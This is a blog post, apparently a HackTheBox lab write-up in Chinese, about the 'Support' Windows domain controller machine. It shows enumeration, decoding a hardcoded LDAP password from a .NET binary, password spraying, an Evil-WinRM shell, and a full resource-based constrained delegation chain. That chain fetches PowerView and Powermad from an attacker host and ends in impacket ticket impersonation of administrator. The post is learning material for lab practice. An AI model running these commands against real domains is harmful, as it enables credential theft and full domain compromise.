@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Information  Kerberos 这是一种身份认证服务，是一种基于加密 Ticket 的身份认证协议。Kerberos 主要由三个部分组成：Key Distribution Center (即KDC)、Client 和 Service。更为详细地概念及其工作流程可以参考网上。  LDAP 全称LightWeight Directory Access Protocol，中文直译过来就是轻">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Support Machine Challenge">
+<meta property="og:url" content="http://example.com/2022/08/08/htb-support/index.html">
+<meta property="og:site_name" content="a0dy&#39;s Home">
+<meta property="og:description" content="Information  Kerberos 这是一种身份认证服务，是一种基于加密 Ticket 的身份认证协议。Kerberos 主要由三个部分组成：Key Distribution Center (即KDC)、Client 和 Service。更为详细地概念及其工作流程可以参考网上。  LDAP 全称LightWeight Directory Access Protocol，中文直译过来就是轻">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-08-08T08:05:00.000Z">
+<meta property="article:modified_time" content="2023-03-19T09:40:34.666Z">
+<meta property="article:author" content="Andy">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="LDAP">
+<meta property="article:tag" content=".NET debugger">
+<meta property="article:tag" content="Kerberos Elevated Privilege">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB Support Machine Challenge</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/08/13/htb-trick/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/08/04/htb-under-constraction/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/08/08/htb-support/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/08/08/htb-support/&text=HTB Support Machine Challenge"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/08/08/htb-support/&title=HTB Support Machine Challenge"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/08/08/htb-support/&is_video=false&description=HTB Support Machine Challenge"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Support Machine Challenge&body=Check out this article: http://example.com/2022/08/08/htb-support/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/08/08/htb-support/&title=HTB Support Machine Challenge"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/08/08/htb-support/&title=HTB Support Machine Challenge"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/08/08/htb-support/&title=HTB Support Machine Challenge"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/08/08/htb-support/&title=HTB Support Machine Challenge"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/08/08/htb-support/&name=HTB Support Machine Challenge&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/08/08/htb-support/&t=HTB Support Machine Challenge"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#information"><span class="toc-number">1.</span> <span class="toc-text"> Information</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberos"><span class="toc-number">1.1.</span> <span class="toc-text"> Kerberos</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ldap"><span class="toc-number">1.2.</span> <span class="toc-text"> LDAP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#enumeration"><span class="toc-number">2.</span> <span class="toc-text"> Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E9%81%8D%E5%8E%86"><span class="toc-number">2.1.</span> <span class="toc-text"> 端口遍历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95"><span class="toc-number">2.2.</span> <span class="toc-text"> SMB共享目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crack-it"><span class="toc-number">3.</span> <span class="toc-text"> Crack It!</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-number">3.1.</span> <span class="toc-text"> .NET程序集反编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ldap%E5%8D%8F%E8%AE%AE%E4%BA%A4%E4%BA%92"><span class="toc-number">3.2.</span> <span class="toc-text"> LDAP协议交互</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0user-flag"><span class="toc-number">3.3.</span> <span class="toc-text"> 拿到User flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0root-flag"><span class="toc-number">3.4.</span> <span class="toc-text"> 拿到Root flag</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rubeusexe%E5%86%92%E5%85%85ticket"><span class="toc-number">3.4.1.</span> <span class="toc-text"> Rubeus.exe冒充ticket</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#impacket%E5%B7%A5%E5%85%B7%E9%9B%86%E8%BF%87%E9%AA%8C%E8%AF%81"><span class="toc-number">3.4.2.</span> <span class="toc-text"> impacket工具集过验证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-number">4.</span> <span class="toc-text"> Summary</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HTB Support Machine Challenge
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Andy</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-08T08:05:00.000Z" itemprop="datePublished">2022-08-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Machine/">Machine</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/NET-debugger/" rel="tag">.NET debugger</a>, <a class="tag-link-link" href="/tags/Kerberos-Elevated-Privilege/" rel="tag">Kerberos Elevated Privilege</a>, <a class="tag-link-link" href="/tags/LDAP/" rel="tag">LDAP</a>, <a class="tag-link-link" href="/tags/RCE/" rel="tag">RCE</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="information"><a class="markdownIt-Anchor" href="#information"></a> Information</h2>
+<h3 id="kerberos"><a class="markdownIt-Anchor" href="#kerberos"></a> Kerberos</h3>
+<p>这是一种身份认证服务，是一种基于加密 Ticket 的身份认证协议。Kerberos 主要由三个部分组成：Key Distribution Center (即KDC)、Client 和 Service。更为详细地概念及其工作流程可以参考网上。</p>
+<h3 id="ldap"><a class="markdownIt-Anchor" href="#ldap"></a> LDAP</h3>
+<p>全称LightWeight Directory Access Protocol，中文直译过来就是轻量目录访问协议。AD是Windows上最强大的功能，而AD是基于LDAP协议的一套解决方案，实现了<strong>谁可以以什么权限访问什么服务</strong>的功能；一下是Wikipedia的原文描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A client starts an LDAP session by connecting to an LDAP server, called a Directory System Agent (DSA), by default on TCP and UDP port 389, or on port 636 for LDAPS (LDAP over TLS/SSL, see below).[9] The client then sends an operation request to the server, and a server sends responses in return. With some exceptions, the client does not need to wait for a response before sending the next request, and the server may send the responses in any order. All information is transmitted using Basic Encoding Rules (BER). </span><br></pre></td></tr></table></figure>
+<p>是一种类似于电话簿的东西，亦可以作为统一认证的解决方案，可以通过其简单目录和属性值来响应一些需求</p>
+<h2 id="enumeration"><a class="markdownIt-Anchor" href="#enumeration"></a> Enumeration</h2>
+<h3 id="端口遍历"><a class="markdownIt-Anchor" href="#端口遍历"></a> 端口遍历</h3>
+<p>nmap可以查看到端口开放情况如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.174</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 989 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-08 14:54:06Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+<p>53端口上运行的<code>Simple DNS Plus</code>是一个适用于Window的DNS服务器软件，我尝试寻找与其有关的漏洞，可是只找到了适用于一些特定版本的拒绝服务请求，很明显这里不是一个切入口，比较显眼的<code>Kerberos</code>和<code>LDAP</code>服务，这些都是之前没有遇到过的新东西，我花了一点事件去了解了一下，并且发现LDAP在OWASP TOP中有他的身影，比较常见的CVE是LDAP Injection，我觉得这可能是入侵目标机器的切入点，Kerberos就目前我所了解到的工作方式是安全性很高，不但需要客户机与AS进行验证，客户机与待访问的服务也需要验证。</p>
+<h3 id="smb共享目录"><a class="markdownIt-Anchor" href="#smb共享目录"></a> SMB共享目录</h3>
+<p>首先进入SMB共享目录看看有没有什么有用的线索，进行Shares枚举:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Sharename       Type      Comment</span><br><span class="line">---------       ----      -------</span><br><span class="line">ADMIN$          Disk      Remote Admin</span><br><span class="line">C$              Disk      Default share</span><br><span class="line">IPC$            IPC       Remote IPC</span><br><span class="line">NETLOGON        Disk      Logon server share </span><br><span class="line">support-tools   Disk      support staff tools</span><br><span class="line">SYSVOL          Disk      Logon server share </span><br></pre></td></tr></table></figure>
+<p>IPC$一般如果配置不当，可能会让入侵者在错误的目录拿到很多有利于自己的信息，但是此台目标机IPC为空目录；NETLOGON和SYSVOL没有权限进行目录访问；可以进入的是一个工具分析目录，权限是公开的正如机器名字Support一样，可以看到里面有很多便携式工具，目录清单如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">7-ZipPortable_21.07.paf.exe</span><br><span class="line">npp.8.4.1.portable.x64.zip</span><br><span class="line">putty.exe</span><br><span class="line">SysinternalsSuite.zip</span><br><span class="line">UserInfo.exe.zip</span><br><span class="line">windirstat1_1_2_setup.exe</span><br><span class="line">WiresharkPortable64_3.6.5.paf.exe</span><br></pre></td></tr></table></figure>
+<p><code>UserInfo.exe.zip</code>和<code>SysinternalsSuite.zip</code>格外显眼，其余的软件都是平时使用的日常软件，解压后发现<code>SysinternalsSuite.zip</code>只是微软的工具包，而<code>UserInfo.exe.zip</code>才是主角，尝试运行里面的<code>UserInfo.exe</code>提示需要电脑有.NET的运行环境，根据提示进行环境的配置后重新运行软件，软件提示有两个参数（除去 -v的可视化参数），有find和User两个参数。这里的查询操作让我困惑了许久，由于对于LDAP的查询很不熟，前导知识得知了LDAP Injection，所以错误地认为可以利用这里地find方法加-first和-last参数得到具有管理权限地账户，PS中输入</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./UserInfo.exe <span class="literal">-v</span> user <span class="literal">-username</span> <span class="string">&quot;administrator&quot;</span></span><br></pre></td></tr></table></figure>
+<p>可以得到查询相应后的一条信息是账户最后修改密码时间。</p>
+<h2 id="crack-it"><a class="markdownIt-Anchor" href="#crack-it"></a> Crack It!</h2>
+<h3 id="net程序集反编译"><a class="markdownIt-Anchor" href="#net程序集反编译"></a> .NET程序集反编译</h3>
+<p>我更换了入侵思路，于是通过Google搜寻到了<a target="_blank" rel="noopener" href="https://github.com/dnSpy/dnSpy">dnSpy</a>是一个专门针对.NET程序地反编译工具，于是我利用此工具对UserInfo这个命令行程序进行了反编译，想尝试找到与LDAP直接进行通信的方法，因为软件想要和LDAP进行通行必然要建立一个LDAP协议的连接。<br />
+于是我在UserInfo.Services的Protected部分找到如下关键代码:</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">UserInfo.Services</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Token: 0x02000006 RID: 6</span></span><br><span class="line">	<span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Protected</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">getPassword</span>()</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">byte</span>[] array = Convert.FromBase64String(Protected.enc_password);</span><br><span class="line">			<span class="built_in">byte</span>[] array2 = array;</span><br><span class="line">			<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; array.Length; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ <span class="number">223</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> Encoding.Default.GetString(array2);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Token: 0x04000005 RID: 5</span></span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> enc_password = <span class="string">&quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Token: 0x04000006 RID: 6</span></span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] key = Encoding.ASCII.GetBytes(<span class="string">&quot;armando&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="ldap协议交互"><a class="markdownIt-Anchor" href="#ldap协议交互"></a> LDAP协议交互</h3>
+<p>阅读代码后，根据如上的流程，我们可以得到对应的Python代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enc_password = <span class="string">b&quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;</span></span><br><span class="line">key = <span class="string">b&quot;armando&quot;</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">array = base64.b64decode(enc_password)</span><br><span class="line">array2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array)):</span><br><span class="line">    array2.append(<span class="built_in">chr</span>(array[i] ^ key[i % <span class="built_in">len</span>(key)] ^ <span class="number">223</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(array2))</span><br></pre></td></tr></table></figure>
+<p>得到明文：<code>nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code></p>
+<p>根据反编译后得到的域，我们利用<code>OpenLDAP</code>的<code>ldapsearch</code>命令进行查询操作</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w <span class="string">&#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27;</span> -b <span class="string">&#x27;DC=support,DC=htb&#x27;</span> | grep info:</span><br></pre></td></tr></table></figure>
+<p>我们可以得到一个名为support的Users的密码字段：<code>Ironside47pleasure40Watchful</code><br />
+我们再通过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Ironside47pleasure40Watchful&quot;</span> &gt; password</span><br><span class="line">ldapsearch -D support\\ldap -H ldap://10.10.11.174 -w <span class="string">&#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27;</span> -b <span class="string">&#x27;CN=Users,DC=support,DC=htb&#x27;</span> | grep name:</span><br></pre></td></tr></table></figure>
+<p>把得到用户名字段复制到users.txt，合成一个小字典用crackmap工具对其进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec winrm support.htb -u users.txt -p password</span><br></pre></td></tr></table></figure>
+<h3 id="拿到user-flag"><a class="markdownIt-Anchor" href="#拿到user-flag"></a> 拿到User flag</h3>
+<p>可以得到的是support是与其密码配对的账户，接着我们对其进行远程连接操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i support.htb -u support -p password</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\support&gt; whoami</span><br><span class="line">support\support                                                                                                                                 </span><br><span class="line">*Evil-WinRM* PS C:\Users\support&gt; type C:\Users\support\Desktop\user.txt</span><br><span class="line">8e4f1*****************b08f40</span><br></pre></td></tr></table></figure>
+<h3 id="拿到root-flag"><a class="markdownIt-Anchor" href="#拿到root-flag"></a> 拿到Root flag</h3>
+<p>Google <code>Kerberos Elevated Privilege</code>，这一找到这样的一篇<a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution">文章</a>,根据这篇文章的流程我们执行如下命令<br />
+导入需要用到的模块</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wget</span> <span class="literal">-uri</span> http://&#123;Your IP&#125;/Powermad.ps1 <span class="literal">-o</span> Powermad.ps1</span><br><span class="line"><span class="built_in">wget</span> <span class="literal">-uri</span> http://&#123;Your IP&#125;/PowerView.ps1 <span class="literal">-o</span> PowerView.ps1</span><br><span class="line"><span class="built_in">Import-Module</span> .\Powermad.ps1</span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br></pre></td></tr></table></figure>
+<p>创建一个新的账户:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-MachineAccount</span> <span class="literal">-MachineAccount</span> fake01 <span class="literal">-Password</span> <span class="variable">$</span>(<span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;123456&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>) <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+<p>查看ObjectSID:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainComputer</span> fake01 <span class="literal">-Properties</span> objectsid</span><br></pre></td></tr></table></figure>
+<p>文章中说的是raw security descriptor</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&#123;Your New Account SID&#125;)&quot;</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p>应用上述规则</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainComputer</span> dc | <span class="built_in">Set-DomainObject</span> <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-DomainComputer</span> dc <span class="literal">-Properties</span> <span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span></span><br></pre></td></tr></table></figure>
+<h4 id="rubeusexe冒充ticket"><a class="markdownIt-Anchor" href="#rubeusexe冒充ticket"></a> Rubeus.exe冒充ticket</h4>
+<p>文章后续就是用的这个方法</p>
+<h4 id="impacket工具集过验证"><a class="markdownIt-Anchor" href="#impacket工具集过验证"></a> impacket工具集过验证</h4>
+<p>除了之前测试UserInfo.exe工具在hosts设置的<code>support.htb</code>以外，还需要设置<code>dc.support.htb</code>，不然会出现服务无法访问的情况</p>
+<p>请求票据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getST support.htb/fake01:<span class="number">123456</span> -dc-ip <span class="number">10.10</span><span class="number">.11</span><span class="number">.174</span> -impersonate administrator -spn www/dc.support.htb</span><br></pre></td></tr></table></figure>
+<p>利用冒充票据获取到管理员权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line">impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k</span><br><span class="line">type C:\Users\Administrator\Desktop\root.txt</span><br><span class="line">97845d96*****************09c9</span><br></pre></td></tr></table></figure>
+<h2 id="summary"><a class="markdownIt-Anchor" href="#summary"></a> Summary</h2>
+<p>这个算是我目前为止接触过最难的Machine，虽然HTB官方写的难度是Easy 😂.<br />
+主要是基础知识欠缺，在hack的时候很多知识都是新的，期待下学期开学后能够接触到Middle的机器。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
